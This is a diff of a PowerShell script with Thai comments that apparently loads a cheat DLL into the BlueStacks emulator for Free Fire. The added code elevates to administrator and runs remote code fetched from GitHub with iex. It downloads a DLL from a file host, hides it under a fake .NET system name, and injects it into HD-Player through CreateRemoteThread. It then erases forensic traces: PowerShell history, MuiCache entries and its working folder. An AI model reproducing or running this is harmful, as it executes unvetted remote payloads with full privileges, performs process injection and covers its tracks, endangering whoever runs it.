@@ -1,93 +1,87 @@
-# =========================================================
-# 1. ขอสิทธิ์ Administrator และดึง Code จาก GitHub
-# =========================================================
+# 1. ขอสิทธิ์ Administrator (จำเป็นมากสำหรับการ Inject)
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $adminCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (Invoke-RestMethod 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1')"
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$adminCmd`"" -Verb RunAs
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
     exit
 }
 
-# =========================================================
-# 2. ตั้งค่าสภาพแวดล้อม
-# =========================================================
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$url = "https://files.catbox.moe/0ukxya.dll"
-$workDir = "$env:LOCALAPPDATA\Temp\SysUpdate"
-$downloadPath = Join-Path $workDir "temp_file"
-$blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
+# 2. ตั้งค่าไฟล์และการพรางตัว
+$url = "https://files.catbox.moe/0ukxya.dll" # ลิงก์ไฟล์ DLL ของคุณ
+$fakeName = "mscories.dll" # ปลอมชื่อให้เหมือนไฟล์ระบบ .NET
+$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
+$dllPath = Join-Path $workDir $fakeName
+$targetProcess = "HD-Player" # ชื่อโปรเซส BlueStacks โดยไม่ต้องมี .exe
 
+# 3. เตรียมที่เก็บไฟล์
 if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+attrib +h +s $workDir
 
-# =========================================================
-# 3. ดาวน์โหลดไฟล์
-# =========================================================
-Write-Host "[*] Downloading Component..." -ForegroundColor Cyan
-try {
-    Invoke-WebRequest -Uri $url -OutFile $downloadPath -UseBasicParsing -ErrorAction Stop
-} catch {
-    Write-Host "[!] Download failed." -ForegroundColor Red; Pause; exit
+# 4. ดาวน์โหลด DLL
+$ProgressPreference = 'SilentlyContinue'
+Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing
+
+# 5. ฟังก์ชันสำหรับ Inject DLL เข้าไปใน BlueStacks (C# Method)
+$Source = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Text;
+
+public class Injector {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    public static void Inject(int pid, string dllPath) {
+        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
+        IntPtr outSize;
+        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
+        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
+    }
 }
+"@
 
-# =========================================================
-# 4. แยกประเภทไฟล์ (ZIP หรือ DLL)
-# =========================================================
-$fileMagic = -join ((Get-Content $downloadPath -Encoding Byte -TotalCount 2) | ForEach-Object { "{0:X2}" -f $_ })
-
-if ($fileMagic -eq "504B") {
-    Write-Host "[+] Extracting Package..." -ForegroundColor Green
-    Expand-Archive -Path $downloadPath -DestinationPath $workDir -Force
-    Remove-Item $downloadPath
-} else {
-    Write-Host "[+] Detected Direct DLL. Renaming..." -ForegroundColor Green
-    $finalDllPath = Join-Path $workDir "SystemData.dll"
-    Move-Item $downloadPath $finalDllPath -Force
-}
-
-# =========================================================
-# 5. การรันระบบ (แก้ปัญหา Missing Entry)
-# =========================================================
-$exe = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
-$dll = Get-ChildItem -Path $workDir -Filter "*.dll" -Recurse | Select-Object -First 1
-
-if ($exe) {
-    Write-Host "[*] Launching EXE: $($exe.Name)" -ForegroundColor Cyan
-    Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName -Wait
-} elseif ($dll) {
-    Write-Host "[*] Attempting to load DLL..." -ForegroundColor Cyan
-    
-    # ทดลองรันด้วย Entry Point มาตรฐานหลายๆ ตัวเพื่อป้องกัน Error
-    $entries = @("DllRegisterServer", "DllInstall", "main", "Control_RunDLL")
-    $success = $false
-
-    foreach ($entry in $entries) {
-        Write-Host "[?] Trying Entry: $entry" -ForegroundColor Gray
-        $proc = Start-Process "rundll32.exe" -ArgumentList "`"$($dll.FullName)`",$entry `"$blueStacksPath`"" -PassThru -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 2
-        
-        if (!$proc.HasExited) {
-            Write-Host "[+] DLL is running with entry: $entry" -ForegroundColor Green
-            $success = $true
-            $proc | Wait-Process
-            break
-        }
+# 6. เริ่มการรัน BlueStacks และ Inject
+if (Test-Path $dllPath) {
+    # ตรวจสอบว่า BlueStacks เปิดอยู่ไหม ถ้าไม่เปิดให้เปิดก่อน
+    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
+    if (!$proc) {
+        Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
+        Start-Sleep -Seconds 5 # รอให้โปรเซสขึ้น
+        $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
     }
 
-    if (!$success) {
-        Write-Host "[!] Rundll32 failed. Trying Reflection Load (Memory)..." -ForegroundColor Yellow
-        try {
-            [Reflection.Assembly]::LoadFile($dll.FullName) | Out-Null
-            Write-Host "[+] DLL Loaded into Memory Successfully." -ForegroundColor Green
-        } catch {
-            Write-Host "[!] This DLL is not a .NET assembly or entry point is invalid." -ForegroundColor Red
-        }
+    if ($proc) {
+        # ทำการ Inject DLL เข้าไป
+        Add-Type -TypeDefinition $Source
+        [Injector]::Inject($proc.Id, $dllPath)
     }
 }
 
-# =========================================================
-# 6. ทำลายร่องรอย
-# =========================================================
-Write-Host "[*] Cleaning up activity traces..." -ForegroundColor Gray
+# 7. --- ลบร่องรอย (The Ghost Clean) ---
+Start-Sleep -Seconds 5
 Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
+$historyPath = (Get-PSReadLineOption).HistorySavePath
+if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
 Clear-History
-Write-Host "[+] Operation Complete." -ForegroundColor Green
+
+# ล้าง Registry MuiCache และ UserAssist เหมือนเดิม
+$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
+Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" } | ForEach-Object {
+    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
+}
+
+# รีสตาร์ท Explorer เพื่อความเนียน
+Stop-Process -Name Explorer -Force -ErrorAction SilentlyContinue
+Start-Process Explorer -WindowStyle Hidden
